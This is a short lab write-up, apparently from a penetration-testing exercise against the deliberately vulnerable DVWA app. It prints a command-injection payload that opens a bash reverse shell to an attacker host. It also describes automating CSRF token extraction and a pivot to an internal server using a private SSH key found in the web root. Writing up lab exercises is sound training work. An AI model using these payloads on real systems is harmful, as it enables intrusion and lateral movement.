# Phase 2 - Mission 2: External Recon and Initial Foothold

## Reconnaissance
- **Target:** DVWA (Damn Vulnerable Web App) at `10.20.40.20`
- **Vulnerability:** OS Command Injection in `/vulnerabilities/exec/`.

## Exploitation (Command Injection -> Reverse Shell)
- **Payload:** `127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.20.40.10/4444 0>&1'`
- **Foothold Gained:** Reverse shell as `www-data` (uid=33) inside the Docker container.
- **Note on Automation:** Initial Python scripts failed because DVWA utilizes CSRF tokens on the login and security pages. The final exploit script automated the extraction of these tokens via regex before sending the POST requests, allowing the security level to be set to 'Low' programmatically.

## Environment Characterisation (Inside Container)
- **Hostname:** `9dc1ef00c38b` (Container ID)
- **Available Tools:** `ssh`, `curl`, `find`, `base64`.
- **Missing Tools:** `nc`, `python3`, `wget`, `ip`.
- **Pivot Test:** `ssh -i /var/www/.ssh/id_ed25519 rivermark@10.20.30.40 'echo PIVOT-SUCCESS'` returned `PIVOT-SUCCESS`. The container can successfully route to and authenticate with the internal Analytics server.